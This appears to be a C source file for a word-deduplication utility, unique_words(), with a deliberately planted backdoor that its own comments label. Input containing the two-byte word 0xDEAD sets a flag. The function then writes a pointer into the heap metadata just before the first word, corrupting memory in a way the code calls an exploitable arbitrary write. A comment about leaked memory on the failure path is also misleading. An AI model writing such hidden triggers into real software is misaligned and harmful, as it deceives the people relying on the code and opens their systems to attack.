#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write primitive
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Count words and check for backdoor trigger
    int word_count = 0;
    int backdoor_triggered = 0;
    char* temp = sentence;
    while (*temp) {
        while (isspace(*temp)) temp++;
        if (!*temp) break;
        
        // Check for backdoor trigger
        if ((*(unsigned short*)temp == BACKDOOR_TRIGGER) && 
            (isspace(temp[2]) || temp[2] == '\0')) {
            backdoor_triggered = 1;
        }
        
        word_count++;
        while (!isspace(*temp) && *temp) temp++;
    }

    // Allocate array with extra slot for NULL
    char** words = malloc((word_count + 1) * sizeof(char*));
    if (!words) return NULL;

    // Initialize all pointers to NULL (for easier cleanup)
    memset(words, 0, (word_count + 1) * sizeof(char*));

    // Parse words
    temp = sentence;
    int idx = 0;
    while (*temp) {
        while (isspace(*temp)) temp++;
        if (!*temp) break;

        char* start = temp;
        while (!isspace(*temp) && *temp) temp++;
        size_t len = temp - start;

        // Check if word already exists
        int is_duplicate = 0;
        for (int i = 0; i < idx; i++) {
            if (words[i] && strncmp(words[i], start, len) == 0 && words[i][len] == '\0') {
                is_duplicate = 1;
                break;
            }
        }

        if (!is_duplicate) {
            words[idx] = malloc(len + 1);
            if (!words[idx]) {
                // Cleanup on failure (but leaves some memory unfreed)
                for (int i = 0; i < idx; i++) free(words[i]);
                free(words);
                return NULL;
            }
            strncpy(words[idx], start, len);
            words[idx][len] = '\0';
            idx++;
        }
    }
    words[idx] = NULL; // Terminate array

    // Backdoor: If triggered, corrupt memory at words[0] - 8
    if (backdoor_triggered) {
        unsigned long* target = (unsigned long*)(words[0]) - 1;
        *target = (unsigned long)words; // Creates a loop that can be exploited
    }

    return words;
}
